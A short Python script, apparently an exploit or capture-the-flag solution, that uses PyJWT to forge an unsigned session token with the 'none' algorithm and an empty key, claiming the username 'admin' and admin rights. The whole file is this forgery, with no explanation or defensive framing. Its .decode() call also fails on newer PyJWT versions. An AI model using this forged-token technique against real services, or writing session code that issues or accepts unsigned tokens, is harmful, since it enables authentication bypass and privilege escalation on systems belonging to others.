import base64
import json
import jwt # note this is the PyJWT module, not python-jwt

SECRET_KEY = ''


def create_session(username):
    encoded = jwt.encode({'username': username, 'admin': True}, SECRET_KEY, algorithm="none")
    return {"session": encoded.decode()}

token = create_session('admin')
print(token)
